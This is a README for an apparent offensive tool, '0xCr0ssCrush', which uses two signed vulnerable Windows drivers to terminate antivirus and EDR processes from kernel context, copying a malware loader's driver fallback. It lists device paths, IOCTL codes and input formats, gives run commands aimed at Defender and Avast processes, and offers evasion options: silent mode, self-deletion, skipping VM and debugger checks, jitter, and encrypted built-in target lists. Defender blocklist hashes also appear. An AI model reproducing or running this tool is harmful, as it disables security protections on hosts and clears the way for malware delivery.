# 0xCr0ssCrush

Public PoCs for the **two signed vulnerable drivers** abused by the
**Cruciferra Malware-as-a-Service loader** - documented by eSentire's
Threat Response Unit in August 2026 as actively killing endpoint protection
since 2025:

| Driver | Signer | Origin | Device (symlink) | IOCTL | Input |
|---|---|---|---|---|---|
| **`DCRCVDrv.sys`** | MOCOMSYS / MocoMsys (South Korea) | document centralization / remote control suite (in-driver markers: `cdsMsgServer.exe`, `cdsNameServer.exe`, `allegro.exe`) | `\\.\DCRCVDRV_U` | `0x2205C0` | 4-byte PID |
| **`Alinubx.sys`** | CnCrypt Foundation (WHQL-published) | transmission-control / filter driver family | `\\.\Alinubx` | `0x222024` | `{ PID: DWORD, exit_status: DWORD }` |

One binary, both drivers, with the same redundancy the operators used:
**if one driver file is blocked, the other one takes over automatically.**
Kill happens in kernel context via the driver's own
`PsLookupProcessByProcessId -> ObOpenObjectByPointer(PROCESS_TERMINATE) ->
ZwTerminateProcess` primitive. No offsets, no PDBs, no shellcode -
cross-version by design, same as every driver in the *Crush family.

> **In the wild.** eSentire TRU documented Cruciferra ($1,200/mo MaaS) loading
> DCRCVDrv.sys from `C:\Windows\Temp` and killing **145 AV/EDR processes**
> before payload delivery. Neither driver had a public PoC until this
> repository.

## Twin-driver fallback (same tactic as the operators)

Threat actors bundle both files in one toolkit so that if an endpoint
product blocks `DCRCVDrv.sys` by hash or policy, the loader drops
`Alinubx.sys` and keeps blinding the host. 0xCr0ssCrush does the same:

```
DCRCVDrv.sys attempt
  |-- device open works?            -> use it
  |-- else install + start service? -> use it
  |-- else blocked / refused
        v
Alinubx.sys attempt
  |-- device open works?            -> use it
  |-- else install + start service? -> use it
  |-- else both blocked             -> exit 3
```

`-k dcrc` / `-k alinubx` only picks which driver is tried first. The
spare is always one step behind, ready to carry the kill if the primary
is refused. Pass `--no-fallback` for a strict single-driver run.

```
[ DCRCVDrv.sys / Alinubx.sys ]   signed vulnerable kernel drivers
      |
      |  CreateFileW(\\.\DCRCVDRV_U | \\.\Alinubx)
      v
[ IOCTL 0x2205C0 | 0x222024 ]    4-byte PID (+ exit status for Alinubx)
      |
      v
[ Kernel ]  PsLookupProcessByProcessId -> ObOpenObjectByPointer -> ZwTerminateProcess
      |
      v
[ Cleanup ] SCM service stopped + deleted
```

## Blocklist these (defender copy-paste)

Both files are signed and currently **missing from Microsoft's Vulnerable
Driver Blocklist** (verified against `DriverPolicy_Enforced.xml` from
`aka.ms/VulnerableDriverBlockList`, 2026-09-08). Add all three hashes of
each to your endpoint block policy:

```
# DCRCVDrv.sys (MocoMsys)
SHA256  87e8d39db624f37d3e77aedf487a2dfd197f71a4730ea74f4e7a4341deaec2ff
SHA1    47d922b0fd5d704025d14ef98ded46e74830a423
MD5     567c158ee0858f8e941d4ab7a6c18dbc

# Alinubx.sys (CnCrypt Foundation)
SHA256  611b3ba687b7f46319a19609605ddfe5225e6d85277d8e923eea3fdb6f7b5b61
SHA1    172c5ce3afab6d63fe12a7e036f20271b9d09c13
MD5     10b3049f4a954665512eca5d24728c89
```

## Quick start

```
1. Keep crosscrush.exe + DCRCVDrv.sys + Alinubx.sys in one folder.
2. Run from an elevated shell:

   crosscrush.exe -n "notepad.exe,avastsvc.exe"
   crosscrush.exe -k dcrc -n "notepad.exe,MsMpEng.exe"

   The tool tries DCRCVDrv first, then Alinubx if the first is blocked.

3. Targets die, service is removed.
```

## Why it matters

- Clean-room PoCs for both drivers (no public exploit was
  cataloged as of 2026-09-10).
- Builds on the **eSentire TRU "ErrTraffic & Cruciferra"** report
  (2026-08-19), which documented both drivers as actively abused
  commodities; the fallback tactic follows the operators' own approach.
- Both signatures are legitimate (MocoMsys / WHQL publisher) - they load
  on stock Windows.
- The 145-process kill list lives in the Cruciferra loader config, not in
  either driver. Both drivers are dumb PID killers - the targeting is
  yours to choose (defaults mirror the loader's hit list).

## Usage

```
crosscrush.exe [options]

  -k, --kind <dcrc|alinubx>  which driver to use (default: auto-detect)
  -s, --silent               suppress all console output
  -r, --repeat               keep running, re-check targets
  -d, --dry-run              enumerate targets without killing
  -j, --json                 machine-readable JSON output
  -l, --list                 print target names and exit
  -v, --version              print version and exit
  -x, --self-destruct        delete self after success
      --no-check             skip VM and debugger checks
      --delay <ms>           sleep before executing
      --jitter <ms>          randomize repeat interval
      --max-attempts <n>     stop after n kill passes
      --svc <name>           custom service name
      --driver <path>        custom driver file path
  -n, --names <csv>          comma-separated target list
  -c, --config <path>        load targets from config file
  -h, --help                 show this help
```

Exit codes: `0` ok, `2` no targets, `3` driver failed, `5` environment.
Targets: `--names` > `--config` > `targets.conf` > built-in encrypted
defaults (134 AV/EDR process names mirrored from the Cruciferra
config).

## Build

```powershell
cargo build --release --target x86_64-pc-windows-gnu
```

Release profile: LTO, single codegen unit, strip, panic=abort.

## Research

- [WRITEUP.md](WRITEUP.md) - RE of both drivers: important import gate,
  device/dispatch analysis, kill helper annotations, and the Cruciferra
  campaign context (eSentire IoCs, MaaS pricing, 145-process hit list).

## References

- eSentire TRU - *Malware-as-a-Service Cocktail: ErrTraffic and
  Cruciferra - Killing Your EDR Since 2025* (2026-08-19)
- eSentire IoCs: DCRCVDrv.sys SHA-256 `87e8d39db624f37d3e77aedf487a2dfd197f71a4730ea74f4e7a4341deaec2ff`
- LOLDrivers entries 2026-08-27 (Alinubx.sys / DCRCVDrv.sys)
- Microsoft Vulnerable Driver Blocklist (2026-09-08)

## License

MIT. See [LICENSE](LICENSE).

## Disclaimer

For research and authorized testing only. Loading these drivers on
systems you do not own is illegal in most jurisdictions.